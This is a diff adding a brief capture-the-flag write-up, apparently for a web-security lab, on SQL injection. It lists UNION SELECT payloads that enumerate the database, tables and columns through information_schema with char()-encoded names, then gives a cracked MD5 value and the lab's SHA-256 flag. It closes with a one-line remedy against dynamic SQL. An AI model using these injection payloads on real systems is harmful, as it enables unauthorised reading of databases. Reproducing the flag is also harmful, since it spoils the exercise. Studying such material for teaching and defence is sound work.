@@ -1,0 +1,23 @@
+get DATABASE_NAME 
+    UNION SELECT 1, database()
+get TABLE_NAME
+    UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = char(77,101,109,98,101,114,95,105,109,97,103,101,115)
+get COLUMNS_NAME
+    UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = char(77,101,109,98,101,114,95,105,109,97,103,101,115) AND TABLE_NAME = char(108,105,115,116,95,105,109,97,103,101,115)
+
+TABLE COLUMNS 
+    * id
+    * url
+    * title
+    * comment
+
+we can find at id 5
+url: borntosec.ddns.net/images.png
+Title: Hack me ?
+comment: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+after decrypt the hash with md5 we get ===> 'albatroz'
+we crypt it with Sha256 we get the flag ==> 'f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188'
+
+how te secure: 
+    Don't use dynamic SQL – don't construct queries with user input
